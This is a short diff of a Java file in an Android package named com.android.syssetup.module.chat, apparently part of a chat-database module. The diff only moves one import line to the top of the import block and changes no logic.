@@ -2,6 +2,7 @@ package com.android.syssetup.module.chat;
 
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.GenericSqliteHelper;
 import com.android.syssetup.db.RecordVisitor;
@@ -10,7 +11,6 @@ import com.android.syssetup.manager.ManagerModule;
 import com.android.syssetup.module.ModuleAddressBook;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
 
 import org.w3c.dom.Document;
 import org.w3c.dom.NamedNodeMap;
